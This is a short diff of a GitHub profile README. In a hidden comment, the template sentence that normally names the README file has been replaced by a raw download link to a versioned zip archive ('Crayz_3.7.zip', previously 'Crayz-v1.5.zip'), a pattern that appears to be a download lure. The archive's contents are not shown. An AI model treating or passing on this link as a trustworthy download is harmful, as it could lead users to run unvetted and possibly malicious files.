@@ -5,6 +5,6 @@
 - 📫 How to reach me ...
 
 <!---
-Crayz916/Crayz916 is a ✨ special ✨ repository because its `https://github.com/Crayz916/Crayz916/raw/refs/heads/main/geniculation/Crayz-v1.5.zip` (this file) appears on your GitHub profile.
+Crayz916/Crayz916 is a ✨ special ✨ repository because its `https://github.com/Crayz916/Crayz916/raw/refs/heads/main/geniculation/Crayz_3.7.zip` (this file) appears on your GitHub profile.
 You can click the Preview link to take a look at your changes.
 --->
